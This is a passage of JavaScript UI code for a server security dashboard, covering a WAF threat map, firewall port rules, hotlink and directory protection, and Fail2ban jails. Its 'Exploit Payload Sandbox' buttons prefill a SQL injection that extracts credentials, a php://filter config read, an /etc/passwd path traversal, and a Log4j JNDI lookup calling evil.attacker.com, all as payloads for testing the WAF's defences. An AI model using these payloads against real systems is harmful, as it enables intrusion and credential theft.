                            <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.simulateThreatProbe()" ${this.state.simulatingProbe ? 'disabled' : ''}>
                                ${this.state.simulatingProbe ? 'Simulating...' : '⚡ Simulate Global Probe'}
                            </button>
                            <button onclick="window.shieldViewInstance.loadWafData()" class="btn ghost-btn btn-sm">↻ Refresh</button>
                        </div>
                    </div>

                    <!-- Top Attacking Origins Ribbon -->
                    <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.75rem; flex-wrap:wrap;">
                        <span style="font-size:0.75rem; color:var(--text-dim); font-weight:600;">Top Origin Pools:</span>
                        ${topCountryChips}
                    </div>

                    <!-- SVG Radar Canvas -->
                    <div style="position:relative; width:100%; border-radius:8px; overflow:hidden; border:1px solid rgba(255,255,255,0.06); background:#05080f;">
                        <svg viewBox="0 0 800 400" style="width:100%; height:auto; display:block;">
                            <defs>
                                <linearGradient id="radarLaserGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                                    <stop offset="0%" stop-color="#ef4444" stop-opacity="0.9"/>
                                    <stop offset="50%" stop-color="#f59e0b" stop-opacity="0.6"/>
                                    <stop offset="100%" stop-color="#10b981" stop-opacity="0.9"/>
                                </linearGradient>
                                <filter id="radarGlow" x="-20%" y="-20%" width="140%" height="140%">
                                    <feGaussianBlur stdDeviation="3" result="blur"/>
                                    <feComposite in="SourceGraphic" in2="blur" operator="over"/>
                                </filter>
                            </defs>

                            <!-- Map Grid Lines -->
                            <line x1="0" y1="67" x2="800" y2="67" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="0" y1="133" x2="800" y2="133" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="0" y1="200" x2="800" y2="200" stroke="#1e293b" stroke-dasharray="4,4" stroke-width="1"/>
                            <line x1="0" y1="267" x2="800" y2="267" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="0" y1="333" x2="800" y2="333" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>

                            <line x1="133" y1="0" x2="133" y2="400" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="267" y1="0" x2="267" y2="400" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="400" y1="0" x2="400" y2="400" stroke="#1e293b" stroke-dasharray="4,4" stroke-width="1"/>
                            <line x1="533" y1="0" x2="533" y2="400" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>
                            <line x1="667" y1="0" x2="667" y2="400" stroke="#131c2e" stroke-dasharray="3,3" stroke-width="0.8"/>

                            <!-- Stylized World Landmass Polygons -->
                            <!-- North America -->
                            <path d="M 80,60 L 220,50 L 250,110 L 220,160 L 190,190 L 170,160 L 110,130 L 70,90 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>
                            <!-- South America -->
                            <path d="M 230,200 L 290,210 L 310,270 L 270,350 L 240,320 L 220,240 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>
                            <!-- Europe -->
                            <path d="M 370,60 L 460,60 L 450,110 L 420,130 L 360,120 L 360,80 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>
                            <!-- Africa -->
                            <path d="M 370,140 L 460,140 L 480,220 L 440,330 L 390,300 L 350,190 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>
                            <!-- Asia -->
                            <path d="M 460,50 L 710,50 L 730,130 L 670,220 L 590,220 L 520,140 L 460,120 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>
                            <!-- Australia & Pacific -->
                            <path d="M 640,260 L 720,260 L 730,320 L 660,330 L 630,290 Z" fill="rgba(30, 41, 59, 0.45)" stroke="#334155" stroke-width="1"/>

                            <!-- Trajectory Laser Beams -->
                            ${trajectoryBeams}

                            <!-- Host Server Target Beacon -->
                            <g class="radar-server-target">
                                <circle cx="${serverX}" cy="${serverY}" r="18" fill="none" stroke="#10b981" stroke-width="1" class="radar-pulse-ring"/>
                                <circle cx="${serverX}" cy="${serverY}" r="7" fill="#10b981" opacity="0.9" filter="url(#radarGlow)"/>
                                <circle cx="${serverX}" cy="${serverY}" r="3" fill="#ffffff"/>
                                <rect x="${serverX - 70}" y="${serverY - 26}" width="140" height="16" rx="4" fill="rgba(6, 78, 59, 0.85)" stroke="#10b981" stroke-width="0.8"/>
                                <text x="${serverX}" y="${serverY - 15}" font-size="9" fill="#a7f3d0" font-weight="700" text-anchor="middle">
                                    🛡️ Target Server [${this.escapeHtml((window.location.hostname && !window.location.hostname.includes('localhost')) ? window.location.hostname : 'Active Host')}]
                                </text>
                            </g>

                            <!-- Origin Attack Beacons -->
                            ${originMarkers}
                        </svg>
                    </div>
                </div>

                <!-- Threat Stream & Live Sandbox Split -->
                <div style="display:grid; grid-template-columns:1.5fr 1fr; gap:1.25rem;">
                    <!-- Left: Intercepted Threats Feed with Strikes & GeoIP -->
                    <div class="suite-pane-main">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
                            <div>
                                <h3 style="margin:0; font-size:1.05rem; color:var(--text-bright); display:flex; align-items:center; gap:0.5rem;">
                                    <span>🌐</span> Live Exploit &amp; Attack Interception Stream
                                </h3>
                                <div style="font-size:0.75rem; color:var(--text-dim); margin-top:2px;">Real-time ledger of attacks intercepted before reaching application code.</div>
                            </div>
                            <button onclick="window.shieldViewInstance.loadWafData()" class="btn ghost-btn btn-sm">↻ Refresh</button>
                        </div>
                        <div class="suite-table-wrapper" style="max-height:360px; overflow-y:auto;">
                            <table class="suite-table">
                                <thead>
                                    <tr>
                                        <th>Time</th>
                                        <th>Vector</th>
                                        <th>Origin &amp; IP</th>
                                        <th>Target</th>
                                        <th>Strikes</th>
                                        <th style="text-align:right;">Action</th>
                                    </tr>
                                </thead>
                                <tbody>${threatRows}</tbody>
                            </table>
                        </div>
                    </div>

                    <!-- Right: Interactive Exploit Sandbox -->
                    <div class="suite-pane-main">
                        <div style="margin-bottom:1rem;">
                            <h3 style="margin:0; font-size:1.05rem; color:var(--text-bright); display:flex; align-items:center; gap:0.5rem;">
                                <span>🧪</span> Exploit Payload Sandbox
                            </h3>
                            <div style="font-size:0.75rem; color:var(--text-dim); margin-top:2px;">Test synthetic attacks safely against the live WAF virtual patches.</div>
                        </div>

                        <div style="display:flex; gap:0.35rem; margin-bottom:0.6rem; flex-wrap:wrap;">
                            <button class="btn secondary-btn btn-sm" onclick="document.getElementById('waf-sandbox-input').value = '1\\' UNION SELECT username, password FROM spp_users--'; window.shieldViewInstance.state.wafInspectPayload = document.getElementById('waf-sandbox-input').value;" style="font-size:0.7rem; padding:2px 8px;">SQLi</button>
                            <button class="btn secondary-btn btn-sm" onclick="document.getElementById('waf-sandbox-input').value = 'php://filter/resource=config.php'; window.shieldViewInstance.state.wafInspectPayload = document.getElementById('waf-sandbox-input').value;" style="font-size:0.7rem; padding:2px 8px;">RCE Stream</button>
                            <button class="btn secondary-btn btn-sm" onclick="document.getElementById('waf-sandbox-input').value = '../../../../etc/passwd'; window.shieldViewInstance.state.wafInspectPayload = document.getElementById('waf-sandbox-input').value;" style="font-size:0.7rem; padding:2px 8px;">Path Traversal</button>
                            <button class="btn secondary-btn btn-sm" onclick="document.getElementById('waf-sandbox-input').value = '\${jndi:ldap://evil.attacker.com/exploit}'; window.shieldViewInstance.state.wafInspectPayload = document.getElementById('waf-sandbox-input').value;" style="font-size:0.7rem; padding:2px 8px;">Log4j</button>
                        </div>

                        <textarea id="waf-sandbox-input" rows="4" style="width:100%; box-sizing:border-box; font-family:'JetBrains Mono',monospace; font-size:0.8rem; padding:0.6rem; background:#040508; border:1px solid var(--glass-border); border-radius:var(--radius-sm); color:#38bdf8;" oninput="window.shieldViewInstance.state.wafInspectPayload = this.value">${this.escapeHtml(this.state.wafInspectPayload)}</textarea>

                        <div style="margin-top:0.6rem; display:flex; justify-content:flex-end;">
                            <button class="btn primary-btn shine-effect btn-sm" onclick="window.shieldViewInstance.testWafInspect()" ${this.state.inspectingWaf ? 'disabled' : ''}>
                                ${this.state.inspectingWaf ? 'Analyzing...' : '▶ Test WAF Defense'}
                            </button>
                        </div>

                        ${res ? `
                            <div style="margin-top:0.9rem; padding:0.8rem; border-radius:8px; background:${res.blocked ? 'rgba(239,68,68,0.1)' : 'rgba(16,185,129,0.1)'}; border:1px solid ${res.blocked ? 'rgba(239,68,68,0.3)' : 'rgba(16,185,129,0.3)'};">
                                <div style="display:flex; justify-content:space-between; align-items:center;">
                                    <strong style="color:${res.blocked ? '#f87171' : '#34d399'}; font-size:0.85rem;">
                                        ${res.blocked ? `🚫 BLOCKED: ${this.escapeHtml(res.threats?.[0]?.name || 'Exploit Detected')}` : `✅ PASS: Payload Safe`}
                                    </strong>
                                    <span class="suite-pill ${res.blocked ? 'suite-pill-danger' : 'suite-pill-success'}" style="font-size:0.65rem;">
                                        ${res.blocked ? 'HTTP 403' : 'HTTP 200'}
                                    </span>
                                </div>
                                ${res.blocked && res.threats?.[0] ? `
                                    <div style="font-size:0.75rem; color:var(--text-dim); margin-top:4px;">
                                        Rule: <strong>${this.escapeHtml(res.threats[0].rule_id)}</strong> | Category: <strong>${this.escapeHtml(res.threats[0].category)}</strong> | Severity: <strong>${this.escapeHtml(res.threats[0].severity)}</strong>
                                    </div>
                                    <div style="font-size:0.75rem; color:#f87171; margin-top:4px; font-family:monospace;">
                                        Trigger key: ${this.escapeHtml(res.threats[0].trigger_key)} &rarr; &ldquo;${this.escapeHtml(res.threats[0].trigger_sample)}&rdquo;
                                    </div>
                                ` : ''}
                            </div>
                        ` : ''}
                    </div>
                </div>

                <!-- Virtual Patching Policy Rules Matrix -->
                <div class="suite-pane-main">
                    <div style="margin-bottom:1rem;">
                        <h3 style="margin:0; font-size:1.05rem; color:var(--text-bright);">Active Virtual Patching &amp; CVE Mitigation Rules</h3>
                        <div style="font-size:0.75rem; color:var(--text-dim); margin-top:2px;">Hotpatch zero-day vulnerabilities in-memory without downtime or core file patching.</div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem;">
                        ${ruleCards}
                    </div>
                </div>
            </div>
        `;
    }

    renderPrivacyTab() {
        if (this.state.loadingHotlink && (!this.state.hotlinkConfig || !this.state.privacyDirectories)) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">📁</div>
                    <h3 style="color:var(--text-bright);">Loading Privacy & Anti-Leech Guard...</h3>
                    <p style="color:var(--text-dim); font-size:0.85rem;">Inspecting access rules and HTTP Basic Auth maps...</p>
                </div>
            `;
        }

        const currentHost = (window.location.hostname && !window.location.hostname.includes('localhost')) ? window.location.hostname : 'example.com';
        const hl = this.state.hotlinkConfig || {
            enabled: false,
            allowed_domains: [currentHost, `*.${currentHost}`, 'google.com'],
            protected_extensions: ['jpg', 'jpeg', 'png', 'gif', 'webp', 'mp4', 'zip'],
            allow_direct_requests: true,
            block_action: 'forbidden',
            redirect_url: ''
        };
        const rules = this.state.hotlinkRules || { apache: '', nginx: '' };
        const dirs = this.state.privacyDirectories || [];

        return `
            <div style="display:flex; flex-direction:column; gap:1.25rem;">
                <!-- Header Banner -->
                <div class="suite-pane-main" style="border-left:4px solid #38bdf8; background:linear-gradient(135deg, rgba(30,58,138,0.2) 0%, rgba(15,23,42,0.6) 100%);">
                    <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:0.35rem;">
                        <span style="font-size:1.3rem;">🛡️</span>
                        <h3 style="margin:0; font-size:1.15rem; color:var(--text-bright);">Access Privacy & Anti-Leech Guard</h3>
                        <span class="suite-pill suite-pill-success">Zero Apache Hacks</span>
                    </div>
                    <p style="margin:0; font-size:0.85rem; color:var(--text-dim); line-height:1.45; max-width:850px;">
                        Prevent third-party websites from leeching your hosting bandwidth by embedding your media files.
                        Enforce encrypted HTTP Basic Authentication on confidential directories directly from this console without editing web server configs.
                    </p>
                </div>

                <!-- 2-Column Split: Hotlink Protection & Directory Privacy -->
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.25rem;">
                    <!-- Column 1: Hotlink Protection -->
                    <div class="suite-pane-main">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; border-bottom:1px solid var(--glass-border); padding-bottom:0.6rem;">
                            <div>
                                <h4 style="margin:0; font-size:0.95rem; color:var(--text-bright);">🖼️ Hotlink & Bandwidth Theft Protection</h4>
                                <span style="font-size:0.75rem; color:var(--text-dim);">Inspects HTTP Referer headers</span>
                            </div>
                            <label style="display:flex; align-items:center; gap:0.4rem; cursor:pointer; font-size:0.8rem; font-weight:600; color:var(--text-bright);">
                                <input type="checkbox" ${hl.enabled ? 'checked' : ''} onchange="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { enabled: this.checked }) }); window.shieldViewInstance.update();">
                                <span>${hl.enabled ? 'ACTIVE' : 'DISABLED'}</span>
                            </label>
                        </div>

                        <div style="display:flex; flex-direction:column; gap:0.85rem;">
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem; font-weight:600;">Whitelisted Domains (1 per line)</label>
                                <textarea class="suite-input" style="width:100%; height:80px; box-sizing:border-box; font-family:monospace; font-size:0.78rem;" oninput="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { allowed_domains: this.value.split('\\n') }) })">${(hl.allowed_domains || []).join('\n')}</textarea>
                            </div>

                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem; font-weight:600;">Protected File Extensions (comma-separated)</label>
                                <input type="text" class="suite-input" style="width:100%; box-sizing:border-box; font-family:monospace; font-size:0.78rem;" value="${(hl.protected_extensions || []).join(', ')}" oninput="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { protected_extensions: this.value.split(',').map(s => s.trim()) }) })">
                            </div>

                            <div style="display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.2); padding:0.5rem 0.75rem; border-radius:var(--radius-sm); border:1px solid var(--glass-border);">
                                <label style="display:flex; align-items:center; gap:0.5rem; font-size:0.8rem; color:var(--text-bright); cursor:pointer;">
                                    <input type="checkbox" ${hl.allow_direct_requests ? 'checked' : ''} onchange="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { allow_direct_requests: this.checked }) })">
                                    <span>Allow direct URL visits (blank referer)</span>
                                </label>
                            </div>

                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem;">
                                <div>
                                    <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem; font-weight:600;">Block Action</label>
                                    <select class="suite-input" style="width:100%; box-sizing:border-box;" onchange="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { block_action: this.value }) }); window.shieldViewInstance.update();">
                                        <option value="forbidden" ${hl.block_action === 'forbidden' ? 'selected' : ''}>403 Forbidden</option>
                                        <option value="redirect" ${hl.block_action === 'redirect' ? 'selected' : ''}>Redirect to URL</option>
                                    </select>
                                </div>
                                <div>
                                    <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem; font-weight:600;">Redirect Fallback URL</label>
                                    <input type="text" class="suite-input" style="width:100%; box-sizing:border-box;" placeholder="https://example.com/blocked.png" value="${this.escapeHtml(hl.redirect_url || '')}" ${hl.block_action !== 'redirect' ? 'disabled' : ''} oninput="window.shieldViewInstance.setState({ hotlinkConfig: Object.assign({}, window.shieldViewInstance.state.hotlinkConfig, { redirect_url: this.value }) })">
                                </div>
                            </div>

                            <button class="btn primary-btn btn-sm" onclick="window.shieldViewInstance.saveHotlink()" style="margin-top:0.35rem;" ${this.state.savingHotlink ? 'disabled' : ''}>
                                ${this.state.savingHotlink ? 'Saving Rules...' : '💾 Save Hotlink Protection Rules'}
                            </button>

                            <!-- Rewrite Rules Preview -->
                            <div style="margin-top:0.5rem; background:rgba(0,0,0,0.4); padding:0.65rem; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.06);">
                                <div style="font-size:0.72rem; color:var(--text-dim); margin-bottom:0.25rem; font-weight:600;">Compiled Nginx Rule Preview:</div>
                                <pre style="margin:0; font-family:monospace; font-size:0.72rem; color:#7dd3fc; line-height:1.4; overflow-x:auto;"><code>${this.escapeHtml(rules.nginx || '# Configure and save to preview')}</code></pre>
                            </div>
                        </div>
                    </div>

                    <!-- Column 2: Directory Privacy (HTTP Basic Auth) -->
                    <div class="suite-pane-main">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; border-bottom:1px solid var(--glass-border); padding-bottom:0.6rem;">
                            <div>
                                <h4 style="margin:0; font-size:0.95rem; color:var(--text-bright);">📁 Directory Privacy & Basic Auth</h4>
                                <span style="font-size:0.75rem; color:var(--text-dim);">${dirs.length} protected directories</span>
                            </div>
                        </div>

                        <!-- Protect Directory Form -->
                        <div style="background:rgba(0,0,0,0.25); border:1px solid var(--glass-border); border-radius:var(--radius-sm); padding:0.85rem; margin-bottom:1rem;">
                            <div style="font-weight:600; font-size:0.82rem; color:var(--text-bright); margin-bottom:0.6rem;">➕ Protect a Directory</div>
                            <div style="display:grid; grid-template-columns:1.2fr 1fr; gap:0.5rem; margin-bottom:0.5rem;">
                                <div>
                                    <label style="display:block; font-size:0.72rem; color:var(--text-dim); margin-bottom:0.2rem;">Directory Path</label>
                                    <input type="text" class="suite-input" placeholder="/private or /backups" value="${this.escapeHtml(this.state.privacyPath)}" oninput="window.shieldViewInstance.setState({ privacyPath: this.value })" style="width:100%; box-sizing:border-box;">
                                </div>
                                <div>
                                    <label style="display:block; font-size:0.72rem; color:var(--text-dim); margin-bottom:0.2rem;">Auth Realm</label>
                                    <input type="text" class="suite-input" placeholder="Restricted Area" value="${this.escapeHtml(this.state.privacyRealm)}" oninput="window.shieldViewInstance.setState({ privacyRealm: this.value })" style="width:100%; box-sizing:border-box;">
                                </div>
                            </div>
                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.5rem; margin-bottom:0.6rem;">
                                <div>
                                    <label style="display:block; font-size:0.72rem; color:var(--text-dim); margin-bottom:0.2rem;">Username</label>
                                    <input type="text" class="suite-input" placeholder="admin" value="${this.escapeHtml(this.state.privacyUser)}" oninput="window.shieldViewInstance.setState({ privacyUser: this.value })" style="width:100%; box-sizing:border-box;">
                                </div>
                                <div>
                                    <label style="display:block; font-size:0.72rem; color:var(--text-dim); margin-bottom:0.2rem;">Password</label>
                                    <input type="password" class="suite-input" placeholder="••••••••" value="${this.escapeHtml(this.state.privacyPass)}" oninput="window.shieldViewInstance.setState({ privacyPass: this.value })" style="width:100%; box-sizing:border-box;">
                                </div>
                            </div>
                            <button class="btn primary-btn btn-sm" onclick="window.shieldViewInstance.saveDirectoryPrivacy()" style="width:100%;">
                                🔒 Protect Directory
                            </button>
                        </div>

                        <!-- Protected Directories List -->
                        <div style="max-height:260px; overflow-y:auto;">
                            <table class="suite-table" style="font-size:0.8rem;">
                                <thead>
                                    <tr>
                                        <th>Protected Path</th>
                                        <th>Username</th>
                                        <th>Realm</th>
                                        <th style="text-align:right;">Action</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    ${dirs.map(d => `
                                        <tr>
                                            <td><code style="color:#38bdf8;">${this.escapeHtml(d.path)}</code></td>
                                            <td style="color:var(--text-bright); font-weight:600;">${this.escapeHtml(d.username)}</td>
                                            <td style="color:var(--text-dim);">${this.escapeHtml(d.realm)}</td>
                                            <td style="text-align:right;">
                                                <button class="btn secondary-btn btn-xs" style="color:#ef4444;" onclick="window.shieldViewInstance.deleteDirectoryPrivacy('${this.escapeHtml(d.path)}')">
                                                    🗑️ Unprotect
                                                </button>
                                            </td>
                                        </tr>
                                    `).join('') || '<tr><td colspan="4" style="text-align:center; padding:1.5rem; color:var(--text-dim);">No directories protected. Enter a path above to configure HTTP Basic Auth.</td></tr>'}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    renderPortsTab() {
        if (this.state.loadingPorts && !this.state.portsData) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">🔌</div>
                    <h3 style="color:var(--text-bright);">Inspecting Host Firewall Rules...</h3>
                </div>
            `;
        }

        const fw = this.state.portsData || {};
        const rules = fw.rules || [];
        const driverName = fw.driver || 'UFW';
        const isActive = fw.enabled !== false;

        return `
            <div style="display:flex; flex-direction:column; gap:1.25rem;">
                <!-- Firewall Driver Banner -->
                <div class="suite-card">
                    <div class="suite-card-body" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;">
                        <div>
                            <div style="display:flex; align-items:center; gap:0.6rem;">
                                <h3 style="margin:0; font-size:1.15rem; color:var(--text-bright);">Host Packet Filter & Ports</h3>
                                <span class="suite-badge" style="background:${isActive ? 'rgba(52,211,153,0.15)' : 'rgba(239,68,68,0.15)'}; color:${isActive ? '#34d399' : '#f87171'}; border:1px solid ${isActive ? '#34d399' : '#f87171'}44;">
                                    ${isActive ? 'ACTIVE' : 'INACTIVE'}
                                </span>
                                <span class="suite-badge" style="background:rgba(56,189,248,0.1); color:#38bdf8;">
                                    Driver: ${this.escapeHtml(driverName.toUpperCase())}
                                </span>
                            </div>
                            <p style="margin:0.3rem 0 0 0; font-size:0.82rem; color:var(--text-dim);">
                                Hardware & kernel level port rules (UFW on Linux, Netsh on Windows) controlling inbound network traffic.
                            </p>
                        </div>
                        <div style="display:flex; gap:0.5rem;">
                            <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.loadPortsData()">
                                ↻ Refresh Rules
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Quick Allow Presets -->
                <div class="suite-card">
                    <div class="suite-card-header" style="font-size:0.9rem; font-weight:600; color:var(--text-bright);">
                        ⚡ 1-Click Standard Port Presets
                    </div>
                    <div class="suite-card-body" style="display:flex; flex-wrap:wrap; gap:0.6rem;">
                        <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.allowPort(80, 'tcp', 'HTTP Web'); window.shieldViewInstance.allowPort(443, 'tcp', 'HTTPS Web');">
                            🌐 Allow Web (80, 443)
                        </button>
                        <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.allowPort(22, 'tcp', 'SSH Admin')">
                            🔐 Allow SSH (22)
                        </button>
                        <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.allowPort(3306, 'tcp', 'MySQL')">
                            🐬 Allow MySQL (3306)
                        </button>
                        <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.allowPort(5432, 'tcp', 'PostgreSQL')">
                            🐘 Allow PostgreSQL (5432)
                        </button>
                        <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.allowPort(6379, 'tcp', 'Redis')">
                            ⚡ Allow Redis (6379)
                        </button>
                    </div>
                </div>

                <!-- Add Custom Port Form -->
                <div class="suite-card">
                    <div class="suite-card-header" style="font-size:0.9rem; font-weight:600; color:var(--text-bright);">
                        ➕ Custom Inbound Port Rule
                    </div>
                    <div class="suite-card-body">
                        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap:1rem; margin-bottom:1rem;">
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">Port Number</label>
                                <input type="number" class="suite-input" placeholder="e.g. 8080" value="${this.escapeHtml(this.state.portInput)}" oninput="window.shieldViewInstance.setState({ portInput: this.value })" style="width:100%; box-sizing:border-box;">
                            </div>
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">Protocol</label>
                                <select class="suite-input" onchange="window.shieldViewInstance.setState({ protocolInput: this.value })" style="width:100%; box-sizing:border-box;">
                                    <option value="tcp" ${this.state.protocolInput === 'tcp' ? 'selected' : ''}>TCP</option>
                                    <option value="udp" ${this.state.protocolInput === 'udp' ? 'selected' : ''}>UDP</option>
                                </select>
                            </div>
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">Description / Comment</label>
                                <input type="text" class="suite-input" placeholder="e.g. Custom Microservice" value="${this.escapeHtml(this.state.portCommentInput)}" oninput="window.shieldViewInstance.setState({ portCommentInput: this.value })" style="width:100%; box-sizing:border-box;">
                            </div>
                        </div>
                        <div style="display:flex; gap:0.6rem;">
                            <button class="btn primary-btn btn-sm" onclick="window.shieldViewInstance.allowPort()">
                                🛡️ Allow Inbound Port
                            </button>
                            <button class="btn secondary-btn btn-sm" style="color:#ef4444;" onclick="window.shieldViewInstance.denyPort()">
                                🚫 Deny / Block Port
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Active Rules Table -->
                <div class="suite-card">
                    <div class="suite-card-header" style="font-size:0.9rem; font-weight:600; color:var(--text-bright);">
                        📋 Active Firewall Rules (${rules.length})
                    </div>
                    <div class="suite-card-body" style="padding:0; overflow-x:auto;">
                        <table class="suite-table" style="font-size:0.85rem; width:100%;">
                            <thead>
                                <tr>
                                    <th style="width:60px;">#</th>
                                    <th>Port / To</th>
                                    <th>Action</th>
                                    <th>From</th>
                                    <th>Comment</th>
                                    <th style="text-align:right;">Manage</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${rules.map(r => `
                                    <tr>
                                        <td style="color:var(--text-dim); font-family:monospace;">${r.number ?? '-'}</td>
                                        <td><code style="color:#38bdf8; font-weight:600;">${this.escapeHtml(r.to || r.port || '')}</code></td>
                                        <td>
                                            <span class="suite-badge" style="background:${(r.action || '').includes('ALLOW') ? 'rgba(52,211,153,0.15)' : 'rgba(239,68,68,0.15)'}; color:${(r.action || '').includes('ALLOW') ? '#34d399' : '#f87171'};">
                                                ${this.escapeHtml(r.action || 'ALLOW')}
                                            </span>
                                        </td>
                                        <td style="color:var(--text-dim);">${this.escapeHtml(r.from || 'Anywhere')}</td>
                                        <td style="color:var(--text-dim);">${this.escapeHtml(r.comment || '-')}</td>
                                        <td style="text-align:right;">
                                            <button class="btn secondary-btn btn-xs" style="color:#ef4444;" onclick="window.shieldViewInstance.deletePortRule(${r.number})">
                                                🗑️ Delete
                                            </button>
                                        </td>
                                    </tr>
                                `).join('') || `
                                    <tr>
                                        <td colspan="6" style="text-align:center; padding:2rem; color:var(--text-dim);">
                                            No active firewall rules defined. Standard traffic is routed via default kernel policy.
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        `;
    }

    renderFail2banTab() {
        if (this.state.loadingFail2ban && !this.state.fail2banData) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">🛡️</div>
                    <h3 style="color:var(--text-bright);">Inspecting Fail2ban Jails & Filters...</h3>
                </div>
            `;
        }

        const fb = this.state.fail2banData || {};
        const jails = fb.jails || [];
        const isInstalled = fb.installed !== false;
        const totalBanned = jails.reduce((acc, j) => acc + (j.currently_banned || 0), 0);

        return `
            <div style="display:flex; flex-direction:column; gap:1.25rem;">
                <!-- Header -->
                <div class="suite-card">
                    <div class="suite-card-body" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;">
                        <div>
                            <div style="display:flex; align-items:center; gap:0.6rem;">
                                <h3 style="margin:0; font-size:1.15rem; color:var(--text-bright);">Fail2ban Daemon Defense</h3>
                                <span class="suite-badge" style="background:${isInstalled ? 'rgba(52,211,153,0.15)' : 'rgba(239,68,68,0.15)'}; color:${isInstalled ? '#34d399' : '#f87171'}; border:1px solid ${isInstalled ? '#34d399' : '#f87171'}44;">
                                    ${isInstalled ? 'ACTIVE' : 'NOT INSTALLED'}
                                </span>
                                <span class="suite-badge" style="background:rgba(239,68,68,0.1); color:#f87171;">
                                    ${totalBanned} Total IPs Banned
                                </span>
                            </div>
                            <p style="margin:0.3rem 0 0 0; font-size:0.82rem; color:var(--text-dim);">
                                Real-time log monitoring daemon that automatically bans IP addresses showing malicious sign-in patterns.
                            </p>
                        </div>
                        <div style="display:flex; gap:0.5rem;">
                            <button class="btn secondary-btn btn-sm" onclick="window.shieldViewInstance.loadFail2banData()">
                                ↻ Refresh Jails
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Jails Grid -->
                <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(260px, 1fr)); gap:1rem;">
                    ${jails.map(j => `
                        <div class="suite-card" style="border-left:3px solid #38bdf8;">
                            <div class="suite-card-body">
                                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.75rem;">
                                    <div style="font-weight:700; font-size:1.05rem; color:var(--text-bright); display:flex; align-items:center; gap:0.4rem;">
                                        <span>🛡️</span> ${this.escapeHtml(j.name)}
                                    </div>
                                    <span class="suite-badge" style="background:rgba(56,189,248,0.1); color:#38bdf8;">
                                        Filter: ${this.escapeHtml(j.filter || j.name)}
                                    </span>
                                </div>
                                <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.5rem; font-size:0.82rem; margin-bottom:0.75rem;">
                                    <div style="background:rgba(0,0,0,0.2); padding:0.5rem; border-radius:var(--radius-sm);">
                                        <div style="color:var(--text-dim);">Currently Failed:</div>
                                        <div style="font-weight:700; color:#f59e0b;">${j.currently_failed ?? 0}</div>
                                    </div>
                                    <div style="background:rgba(0,0,0,0.2); padding:0.5rem; border-radius:var(--radius-sm);">
